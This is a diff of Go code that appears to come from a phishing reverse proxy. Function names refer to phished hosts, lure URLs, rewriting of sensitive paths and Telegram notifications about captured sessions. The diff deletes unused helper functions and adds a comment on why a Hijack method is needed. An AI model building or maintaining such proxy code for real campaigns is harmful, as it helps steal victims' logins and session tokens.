@@ -2149,16 +2149,6 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	return body
 }
 
-func (p *HttpProxy) replaceHeaderWithOriginal(req *http.Request, header string) {
-	if _, ok := req.Header[header]; ok {
-		Hmap := req.Header.Values(header)
-		for i, H := range Hmap {
-			Hmap[i] = p.replaceStringWithOriginal(H)
-		}
-		req.Header[header] = Hmap
-	}
-}
-
 func (p *HttpProxy) replaceHeaderWithPhished(resp *http.Response, header string) {
 	if _, ok := resp.Header[header]; ok {
 		Hmap := resp.Header.Values(header)
@@ -2167,18 +2157,6 @@ func (p *HttpProxy) replaceHeaderWithPhished(resp *http.Response, header string)
 		}
 		resp.Header[header] = Hmap
 	}
-}
-
-func (p *HttpProxy) replaceStringWithOriginal(str string) string {
-	re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
-
-	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
-		if o_host, ok := p.replaceHostWithOriginal(s_host); ok {
-			return o_host
-		}
-		return s_host
-	})
-	return str
 }
 
 func (p *HttpProxy) replaceStringWithPhished(str string) string {
@@ -2281,26 +2259,6 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				Certificates:       []tls.Certificate{*cert},
 			}, nil
 		}
-	}
-}
-
-func (p *HttpProxy) setSessionCmsgid(sid string, cmsgid string) {
-	if sid == "" {
-		return
-	}
-	s, ok := p.sessions[sid]
-	if ok {
-		s.SetCmsgid(cmsgid)
-	}
-}
-
-func (p *HttpProxy) setSessionTmsgid(sid string, tmsgid string) {
-	if sid == "" {
-		return
-	}
-	s, ok := p.sessions[sid]
-	if ok {
-		s.SetTmsgid(tmsgid)
 	}
 }
 
@@ -2990,14 +2948,12 @@ func (dumb dumbResponseWriter) WriteHeader(code int) {
 	panic("WriteHeader() should not be called on this ResponseWriter")
 }
 
+// Hijack satisfies http.Hijacker. It is required, not decoration: goproxy type
+// asserts the writer to http.Hijacker and panics with "httpserver does not
+// support hijacking" when the assertion fails. Having no textual reference, it is
+// easy to mistake for dead code.
 func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
-}
-
-func orPanic(err error) {
-	if err != nil {
-		panic(err)
-	}
 }
 
 func getContentType(path string, data []byte) string {
@@ -3043,10 +2999,6 @@ func rewriteSensitivePaths(body []byte, phishHost string) []byte {
 	bodyStr = strings.ReplaceAll(bodyStr, protoRelative, "/")
 
 	return []byte(bodyStr)
-}
-
-func (p *HttpProxy) ReloadTelegramConfig() {
-	log.Info("Telegram configuration reloaded")
 }
 
 func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
